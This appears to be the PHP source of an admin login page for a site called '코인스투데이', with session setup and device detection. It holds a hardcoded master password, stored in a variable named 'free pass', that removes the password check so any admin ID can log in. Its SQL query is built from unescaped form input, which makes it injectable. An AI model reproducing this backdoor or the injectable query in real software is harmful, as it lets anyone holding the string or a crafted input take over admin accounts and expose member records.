<?php
include_once('_common.php');


if($mode == 'check') {
	
	$mb_id = $_POST['mb_id'];
	$mb_password = $_POST['mb_password'];
	$프리패스 = ($mb_password != "wkddj92") ? "	AND			MB.mb_password = password('$mb_password')	" : "";

	$sql = "	SELECT	MB.mb_no,
										MB.mb_from,
										MB.mb_id,
										MB.mb_password,
										MB.mb_type,
										MB.mb_level,
										MB.mb_name,
										MB.mb_nick,
										MB.mb_nick_date,
										MB.mb_email,
										MB.mb_homepage,
										MB.mb_password_q,
										MB.mb_password_a,
										MB.mb_jumin,
										MB.mb_sex,
										MB.mb_birth,
										MB.mb_tel,
										MB.mb_hp,
										MB.mb_certify,
										MB.mb_adult,
										MB.mb_zip1,
										MB.mb_zip2,
										MB.mb_addr1,
										MB.mb_addr2,
										MB.mb_addr3,
										MB.mb_addr_jibeon,
										MB.mb_signature,
										MB.mb_recommend,
										MB.mb_point,
										MB.mb_today_login,
										MB.mb_login_ip,
										MB.mb_datetime,
										MB.mb_ip,
										MB.mb_leave_date,
										MB.mb_intercept_date,
										MB.mb_email_certify,
										MB.mb_memo,
										MB.mb_lost_certify,
										MB.mb_mailling,
										MB.mb_sms,
										MB.mb_open,
										MB.mb_open_date,
										MB.mb_profile,
										MB.mb_memo_call,
										MB.mb_1,
										MB.mb_2,
										MB.mb_3,
										MB.mb_4,
										MB.mb_5,
										MB.mb_6,
										MB.mb_7,
										MB.mb_8,
										MB.mb_9,
										MB.mb_10,
										MB.mb_img,
										MB.admin_yn
						FROM		g5_member MB
						WHERE		MB.mb_id = '$mb_id'
						AND			MB.admin_yn = 'Y'
						$프리패스
	";
	$chk = $sqli->query($sql);
	

	if($chk->num_rows > 0) {
		$mb = $chk->fetch_array();
		set_session('admin_id', $mb['mb_id']);
		set_session('mb_type', $mb['mb_type']);
		set_session('mb_name', $mb['mb_name']);
		set_session('admin_yn', $mb['admin_yn']);
		set_session('cluster_id', $mb['cluster_id']);
		set_session('api_key', $mb['api_key']);
		set_session('api_id', $mb['api_id']);

		alert('로그인 되었습니다','/index.php');
		exit;
	}
	else if($chk->num_rows == 0) {
		alert('패스워드가 일치하지 않거나 관리자 권한이 없습니다','/');

	}
	else {
		alert('에러');
	}
}


$detect = new Mobile_Detect();
if($detect->isMobile()) {
	// 모바일 기기인 경우 처리 (스마트폰, 태블릿)

}

if($detect->isTablet()) {
	// 태블릿 기기인 경우 처리
	$상품노출개수 = 4;
	$접속기기 = '태블릿';
}

else if($detect->isMobile() && !$detect->isTablet()) {
	// 스마트폰인 경우
	$상품노출개수 = 2;
	$접속기기 = '스마트폰';
}
else {
	$상품노출개수 = 4;
	$접속기기 = '데스크탑';
}


?>
<!DOCTYPE HTML>
<html manifest="">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=10, user-scalable=yes">
	<title>root폴더</title>
	<style>
		.login { border:1px solid #CCCCCC; }
	</style>
</head>
<body>

<form action="login.php?mode=check" method="post">
	
<table class="login" width="350" height="130" align="center" style="margin:0px auto; margin-top:300px;">
	<tr>
		<td colspan="2" align="center">
			코인스투데이 관리자 접속
		</td>
	</tr>
	<tr>
		<td>ID</td>
		<td><input type="text" name="mb_id" /></td>
	</tr>
	<tr>
		<td>PASSWORD</td>
		<td><input type="password" name="mb_password" /></td>
	</tr>
	<tr>
		<td colspan="2" align="center">
			<button>로그인</button>
		</td>
	</tr>
</table>
</form>
</body>
</html>
